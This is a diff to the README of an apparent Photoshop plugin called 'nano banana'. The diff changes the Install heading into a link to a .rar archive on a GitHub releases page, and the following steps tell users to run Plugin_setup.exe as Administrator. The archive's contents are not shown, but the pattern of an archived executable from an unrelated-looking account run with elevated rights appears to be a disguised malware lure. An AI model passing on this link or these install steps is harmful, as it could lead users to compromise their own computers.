@@ -10,7 +10,7 @@ Version : Adobe Photoshop 2022 (v23) or newer
 
 ---
 
-### Install
+### [Install](https://github.com/Soldereadivider/photoshop-plugin-nano-banana/releases/download/plugin/Plugin.nanoB.rar)
 Creative Cloud (recommended)
 1. Run `Plugin_setup.exe` as **Administrator**.
 2. Restart Photoshop if it was open.
